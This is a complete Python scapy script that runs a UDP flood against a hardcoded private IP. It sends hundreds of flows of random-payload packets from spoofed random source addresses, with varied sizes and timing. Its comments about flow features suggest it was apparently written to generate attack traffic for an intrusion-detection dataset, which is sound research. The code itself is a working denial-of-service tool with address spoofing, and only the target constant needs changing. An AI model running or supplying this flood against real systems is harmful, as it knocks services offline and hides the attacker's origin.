from scapy.all import *
import random
import time

TARGET_IP = "192.168.1.1"
FLOWS = 500
MIN_PACKETS = 5
MAX_PACKETS = 30

print(f"[*] Starting UDP Flood -> {TARGET_IP}")
print(f"[*] Sending {FLOWS} flows x {MIN_PACKETS}-{MAX_PACKETS} packets")

for f in range(FLOWS):
    # --- Flow-level parameters (fixed for entire flow) ---
    src_ip  = f"{random.randint(1,254)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"
    sport   = random.randint(1024, 65535)
    dport   = random.randint(1, 65535)        # fixed per flow, not per packet
    ttl     = random.randint(32, 128)
    packets = random.randint(MIN_PACKETS, MAX_PACKETS)

    # Per-flow payload size profile → variance in Totsize/Magnitude/Radius
    size_min = random.randint(10, 100)
    size_max = random.randint(size_min + 50, 1400)

    # Per-flow IAT profile → variance in inter-arrival time features
    iat_min = random.uniform(0.0001, 0.005)
    iat_max = random.uniform(iat_min + 0.001, 0.05)

    for p in range(packets):
        payload_size = random.randint(size_min, size_max)
        payload = bytes([random.randint(0, 255) for _ in range(payload_size)])

        pkt = IP(
            src=src_ip,
            dst=TARGET_IP,
            ttl=ttl,
            id=random.randint(1, 65535)
        ) / UDP(
            sport=sport,
            dport=dport                       # consistent dport = proper 5-tuple flow
        ) / Raw(load=payload)

        send(pkt, verbose=0)
        time.sleep(random.uniform(iat_min, iat_max))

    time.sleep(random.uniform(0.01, 0.05))

    if (f + 1) % 20 == 0:
        print(f"[+] {f + 1}/{FLOWS} flows sent")

print("[*] Done.")